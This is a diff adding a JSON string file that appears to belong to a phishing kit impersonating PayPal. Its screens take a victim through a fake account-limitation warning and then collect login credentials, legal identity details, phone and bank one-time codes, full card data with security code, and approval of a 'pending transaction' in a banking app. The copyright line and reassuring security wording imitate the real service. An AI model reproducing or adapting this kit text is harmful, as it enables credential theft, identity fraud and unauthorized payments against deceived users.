@@ -1,0 +1,117 @@
+{
+    "COMMON": {
+        "NEXT": "[ZH] Next",
+        "CONTINUE": "[ZH] Continue",
+        "SUBMIT": "[ZH] Submit",
+        "CONFIRM": "[ZH] Confirm",
+        "VERIFY": "[ZH] Verify",
+        "CLOSE": "[ZH] Close",
+        "LOADING": "[ZH] Loading...",
+        "SECURE_CONNECTION": "[ZH] Secure Connection",
+        "COPYRIGHT": "[ZH] © 1999-2026 PayPal Inc. All rights reserved.",
+        "PRIVACY": "[ZH] Privacy",
+        "LEGAL": "[ZH] Legal",
+        "CONTACT": "[ZH] Contact",
+        "WORLDWIDE": "[ZH] Worldwide"
+    },
+    "SECURITY": {
+        "CHECKING": "[ZH] Checking your security...",
+        "VERIFYING": "[ZH] Verifying security...",
+        "CONNECTING": "[ZH] Connecting..."
+    },
+    "LOGIN": {
+        "TITLE": "[ZH] Log in to your PayPal account",
+        "EMAIL_PLACEHOLDER": "[ZH] Email or mobile number",
+        "PASSWORD_PLACEHOLDER": "[ZH] Password",
+        "FORGOT": "[ZH] Forgot password?",
+        "OR": "[ZH] or",
+        "SIGN_UP": "[ZH] Sign Up",
+        "LOG_IN": "[ZH] Log In",
+        "ERROR_CREDENTIALS": "[ZH] Check your entries and try again."
+    },
+    "LIMITED": {
+        "TITLE": "[ZH] We need to confirm it's you",
+        "DESCRIPTION": "[ZH] We noticed a login from a device we don't recognize. To keep your account secure, we just need to verify your identity.",
+        "BUTTON": "[ZH] Confirm Identity",
+        "WHY_LINK": "[ZH] Why do I need to do this?",
+        "DIALOG_TITLE": "[ZH] Why is my account limited?",
+        "ALERT_TITLE": "[ZH] Unusual Activity Detected",
+        "ALERT_DESC": "[ZH] We noticed a login attempt from a device or location we don't recognize.",
+        "WHATS_LIMITED": "[ZH] What's Limited",
+        "LIMIT_1": "[ZH] Sending payments",
+        "LIMIT_2": "[ZH] Withdrawing funds",
+        "LIMIT_3": "[ZH] Removing payment methods",
+        "HOW_TO_RESOLVE": "[ZH] How to Resolve",
+        "RESOLVE_DESC": "[ZH] This is a temporary security measure. Once you confirm your identity, full account access will be restored immediately.",
+        "SECURE_ACCOUNT": "[ZH] Secure Account"
+    },
+    "PERSONAL": {
+        "TITLE": "[ZH] Verify your information",
+        "SUBTITLE": "[ZH] Please confirm your personal details to help us secure your account.",
+        "ERROR_TITLE": "[ZH] Please check your details",
+        "ERROR_DESC": "[ZH] Make sure your information matches your legal ID.",
+        "COUNTRY": "[ZH] Country of residence",
+        "FIRST_NAME": "[ZH] Legal first name",
+        "LAST_NAME": "[ZH] Legal last name",
+        "DOB": "[ZH] Date of birth",
+        "PHONE": "[ZH] Mobile number",
+        "ADDRESS": "[ZH] Street address",
+        "CITY": "[ZH] City",
+        "ZIP": "[ZH] Zip code",
+        "MUST_BE_18": "[ZH] Must be 18+"
+    },
+    "PHONE": {
+        "TITLE_INPUT": "[ZH] Let's confirm your number",
+        "DESC_INPUT": "[ZH] We'll send a code to your mobile to ensure your account is secure.",
+        "TITLE_CODE": "[ZH] Enter your code",
+        "DESC_CODE": "[ZH] We sent a security code to your mobile device.",
+        "ERROR_TITLE": "[ZH] That didn't work",
+        "DISCLAIMER": "[ZH] By continuing, you confirm that you are authorized to use this phone number. Standard message and data rates may apply.",
+        "SEND_CODE": "[ZH] Send Code",
+        "CHANGE": "[ZH] Change",
+        "RESEND": "[ZH] Get a new code",
+        "RESEND_WAIT": "[ZH] Resend code in {{seconds}}s",
+        "CODE_SENT": "[ZH] Code sent!"
+    },
+    "CARD": {
+        "TITLE": "[ZH] Link a card",
+        "SUBTITLE": "[ZH] Link a card to confirm your identity and lift account limitations.",
+        "ERROR_TITLE": "[ZH] Check your card details",
+        "Card Number": "[ZH] Card number",
+        "Expiration Date": "[ZH] Expiration Date",
+        "Security Code": "[ZH] Security Code",
+        "Billing Address": "[ZH] Billing Address"
+    },
+    "CARD_OTP": {
+        "BADGE": "[ZH] Bank Verification",
+        "TITLE": "[ZH] Confirm with your bank",
+        "DESC": "[ZH] We've sent a code to the mobile number registered with your card ending in •••• {{last4}}.",
+        "INVALID_TITLE": "[ZH] Invalid Code",
+        "INVALID_DESC": "[ZH] Please check the code and try again.",
+        "INPUT_LABEL": "[ZH] Enter Bank Code",
+        "NO_CODE": "[ZH] Didn't receive a code?",
+        "RESEND": "[ZH] Resend Code",
+        "RESEND_WAIT": "[ZH] Resend available in {{seconds}}s"
+    },
+    "BANK_APP": {
+        "TITLE": "[ZH] Confirm it's you",
+        "DESC": "[ZH] Please open your banking app on your mobile device and approve the pending transaction to verify your identity.",
+        "WHY_TITLE": "[ZH] Why is this needed?",
+        "WHY_DESC": "[ZH] Your bank requires strong authentication for this request. Once approved, return here to continue.",
+        "BUTTON": "[ZH] I have approved it",
+        "SECURE_VERIFICATION": "[ZH] Secure Verification"
+    },
+    "SUCCESS": {
+        "TITLE": "[ZH] Account Restored",
+        "BADGE_TITLE": "[ZH] Limitation Lifted",
+        "BADGE_DESC": "[ZH] Your account access has been fully restored. You can now send, withdraw, and manage your funds securely.",
+        "EMAIL_SENT": "[ZH] A confirmation email has been sent to {{email}}.",
+        "BUTTON": "[ZH] Return to Dashboard"
+    },
+    "MODAL_LANG": {
+        "TITLE": "[ZH] Choose your language",
+        "DESC": "[ZH] We detected you are in {{country}}, but your device is set to {{deviceLang}}.",
+        "USE_DEVICE": "[ZH] Use {{deviceLang}}",
+        "USE_IP": "[ZH] Use {{ipLang}}"
+    }
+}
